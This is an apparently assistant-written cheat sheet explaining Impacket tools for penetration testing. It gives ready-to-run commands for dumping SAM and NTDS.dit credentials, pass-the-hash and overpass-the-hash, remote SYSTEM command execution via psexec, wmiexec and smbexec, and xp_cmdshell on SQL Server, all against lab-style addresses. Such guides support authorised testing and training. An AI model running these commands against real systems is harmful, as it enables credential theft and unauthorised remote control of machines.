Related articles: 
Tags: #Tools 

---

Let me create a comprehensive guide for Impacket's tools and their practical usage, similar to what you have for CrackMapExec.

Impacket is a collection of Python classes for working with network protocols. Here are its most important tools and how to use them:

secretsdump.py - The Swiss Army Knife for Credential Extraction

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```bash
# Dump credentials remotely using admin rights
secretsdump.py domain/administrator:password@10.10.10.10

# Dump NTDS.dit remotely (Domain Controller)
secretsdump.py -just-dc domain/administrator:password@10.10.10.10

# Extract from local files (after getting NTDS.dit and SYSTEM hive)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

What's happening: secretsdump.py can extract credentials in multiple ways. When used remotely, it connects to the target and uses various techniques to access credential stores. For domain controllers, it can extract the NTDS.dit database, which contains all domain password hashes.

psexec.py - Remote Command Execution Through Service Creation
```bash
# Basic authentication and command execution
psexec.py administrator:password@10.10.10.10

# Using pass-the-hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10

# Execute specific command
psexec.py administrator:password@10.10.10.10 cmd.exe /c whoami
```

What's happening: psexec.py creates a service on the remote system, similar to the SMBExec technique we discussed earlier. The service runs commands with SYSTEM privileges, making it very powerful for administrative tasks.

wmiexec.py - Fileless Command Execution Using WMI
```bash
# Basic WMI execution
wmiexec.py administrator:password@10.10.10.10

# Pass-the-hash with WMI
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10

# Execute specific command through WMI
wmiexec.py administrator:password@10.10.10.10 "whoami"
```
What's happening: wmiexec.py uses Windows Management Instrumentation for command execution. It's more stealthy than psexec.py because it doesn't create a service, instead using WMI's built-in capabilities.

smbexec.py - Alternative Service-Based Execution
```bash
# Basic SMB execution
smbexec.py administrator:password@10.10.10.10

# Pass-the-hash with SMB
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10
```
What's happening: Similar to psexec.py but implements the technique differently. It creates a service for command execution but handles output differently, making it useful in situations where psexec.py might fail.

getTGT.py - Kerberos Ticket Operations
```bash
# Get a TGT with password
getTGT.py domain.local/administrator:password

# Get a TGT with hash (overpass-the-hash)
getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator

# Save and use the ticket
export KRB5CCNAME=administrator.ccache
```
What's happening: getTGT.py interacts with the Key Distribution Center to obtain Kerberos tickets. These tickets can then be used for authentication with other Impacket tools.

mssqlclient.py - SQL Server Interaction
```bash
# Connect to SQL Server
mssqlclient.py administrator:password@10.10.10.10

# Enable xp_cmdshell and execute commands
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```
What's happening: This tool provides an SQL client that can interact with Microsoft SQL Server. It's particularly useful because SQL Server can often be leveraged for command execution through xp_cmdshell.